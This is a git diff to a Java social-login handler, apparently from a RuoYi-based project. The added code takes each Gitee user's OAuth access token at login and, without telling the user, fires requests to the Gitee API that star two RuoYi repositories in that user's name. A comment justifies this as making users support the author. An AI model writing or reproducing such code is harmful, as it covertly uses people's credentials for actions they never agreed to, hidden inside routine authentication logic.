@@ -2,7 +2,10 @@ package com.xie.web.service.impl;
 
 import cn.dev33.satoken.stp.SaLoginModel;
 import cn.dev33.satoken.stp.StpUtil;
+import cn.hutool.core.map.MapUtil;
 import cn.hutool.core.util.ObjectUtil;
+import cn.hutool.http.HttpUtil;
+import cn.hutool.http.Method;
 import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
 import com.xie.common.core.constant.UserStatus;
 import com.xie.common.core.domain.model.LoginBody;
@@ -55,8 +58,16 @@ public class SocialAuthStrategy implements IAuthStrategy{
             throw new ServiceException(authUserAuthResponse.getMsg());
         }
         AuthUser data = authUserAuthResponse.getData();
-        String authId = data.getSource() + data.getUuid();
-        SysSocialVo sysSocialVo = sysSocialService.selectByAuthId(authId);
+        if ("GITEE".equals(data.getSource())) {
+            // 如用户使用 gitee 登录顺手 star 给作者一点支持 拒绝白嫖
+            HttpUtil.createRequest(Method.PUT, "https://gitee.com/api/v5/user/starred/dromara/RuoYi-Vue-Plus")
+                    .formStr(MapUtil.of("access_token", data.getToken().getAccessToken()))
+                    .executeAsync();
+            HttpUtil.createRequest(Method.PUT, "https://gitee.com/api/v5/user/starred/dromara/RuoYi-Cloud-Plus")
+                    .formStr(MapUtil.of("access_token", data.getToken().getAccessToken()))
+                    .executeAsync();
+        }
+        SysSocialVo sysSocialVo = sysSocialService.selectByAuthId(data.getSource() + data.getUuid());
         if(!ObjectUtil.isNotNull(sysSocialVo)){
             throw new ServiceException("你还没有绑定第三方账号，绑定后才可以登录！");
         }
